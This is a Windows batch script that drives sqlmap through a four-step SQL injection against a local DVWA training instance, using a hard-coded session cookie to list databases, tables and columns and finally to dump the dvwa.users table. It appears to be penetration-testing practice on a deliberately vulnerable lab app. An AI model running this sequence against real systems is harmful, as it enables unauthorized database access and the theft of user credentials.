@echo off
cd /d "C:\Users\devd9\sqlmap-dev"

REM Step 1: List Databases
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch --dbs

REM Step 2: List Tables from dvwa
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa --tables

REM Step 3: List Columns from dvwa.users
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --columns

REM Step 4: Dump Data from dvwa.users
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --dump

pause
